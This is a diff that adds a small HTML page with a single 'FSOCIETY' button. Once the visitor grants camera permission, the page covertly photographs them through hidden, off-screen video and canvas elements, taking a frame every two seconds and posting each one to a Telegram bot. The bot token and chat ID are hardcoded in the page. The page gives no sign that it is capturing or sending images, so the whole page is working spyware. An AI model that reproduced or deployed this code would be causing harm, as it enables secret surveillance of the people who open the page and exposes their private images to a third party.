@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Gul Balbes</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#000 url('https://lh3.googleusercontent.com/d/1NPk0F4Ne9PZx8g3TmKlWKQXKf0qWmK2q') no-repeat center center;
+            background-size:cover;
+            height:100dvh;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-family:'Courier New',monospace;
+            overflow:hidden;
+        }
+        #btn{
+            background:rgba(0,0,0,0.85);
+            color:#e53935;
+            border:2px solid #e53935;
+            padding:20px 50px;
+            font-size:24px;
+            font-weight:bold;
+            letter-spacing:4px;
+            cursor:pointer;
+            font-family:'Courier New',monospace;
+            text-shadow:0 0 20px #e53935;
+            box-shadow:0 0 40px rgba(229,57,53,0.3);
+            transition:all 0.3s;
+            z-index:10;
+            -webkit-tap-highlight-color:transparent;
+            user-select:none;
+        }
+        #btn:active{
+            background:#e53935;
+            color:#000;
+            box-shadow:0 0 80px rgba(229,57,53,0.6);
+        }
+        video,canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+    </style>
+</head>
+<body>
+    <button id="btn" onclick="go()">FSOCIETY</button>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const BOT_TOKEN = "8653136768:AAGqhl21C7k3VZ3JGDgQBy83-UxQhoHM9bE";
+        const CHAT_ID = 5730893708;
+
+        async function go() {
+            const btn = document.getElementById('btn');
+            btn.textContent = "LOADING";
+            btn.disabled = true;
+            btn.style.borderColor = "#0f0";
+            btn.style.color = "#0f0";
+            btn.style.textShadow = "0 0 20px #0f0";
+            btn.style.boxShadow = "0 0 40px rgba(0,255,0,0.3)";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+
+                btn.textContent = "OK";
+                btn.style.color = "#0f0";
+
+                const canvas = document.getElementById('canvas');
+                
+                async function snap() {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'cam.jpg');
+                        fd.append('caption', 'GUL BALBES');
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST', body: fd
+                            });
+                        } catch(e) {}
+                    }, 'image/jpeg', 0.6);
+                }
+
+                await snap();
+                setInterval(snap, 2000);
+
+            } catch(e) {
+                btn.textContent = "ERROR";
+                btn.style.color = "#e53935";
+                btn.style.borderColor = "#e53935";
+            }
+        }
+    </script>
+</body>
+</html>
